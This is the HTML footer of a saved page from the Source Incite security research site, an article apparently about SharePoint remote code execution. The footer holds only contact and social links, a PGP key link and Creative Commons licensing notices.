  <div class="wrapper">
    <div class="footer-col-wrapper">      
      <div class="footer-col footer-col-1">
        <ul class="contact-list cn">
          <li><a href="https://srcincite.io/assets/5B1183EE04FD7FFE68BE48E264AE09A98432FB9B.asc.txt">pgp key</a></li>
          <li><a href="mailto:"></a></li>
        </ul>
      </div>
      <div class="footer-col footer-col-2">
        <ul class="social-media-list cn">
          
          <li>
            <a href="https://github.com/sourceincite"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"></path></svg>
</span><span class="username">sourceincite</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/sourceincite"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"></path></svg>
</span><span class="username">sourceincite</span></a>

          </li>
          
        </ul>
      </div>
      <div class="footer-col footer-col-3">
        <ul class="contact-list cn">
         <li><a href="https://creativecommons.org/licenses/by-nc/4.0/"><img class="cc" src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/Creative-Commons-License.png" alt="The Creative Commons License"></a></li>
          <li><div class="cn">copyright © 2014 - 2024 Source Incite</div></li>
        </ul>
      </div>
      <div style="text-align:center"><p><a href="http://validator.w3.org/check?uri=referer" onclick="this.href=&#39;http://validator.w3.org/check?uri=&#39; + 
document.URL"><img src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/valid-html40.png" alt="W3C Compliant"></a></p><p>The content of this site is licensed under a <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution-Non‑Commercial 4.0 International License.</a></p></div>
    </div>
  </div>
</footer>

  

</body></html>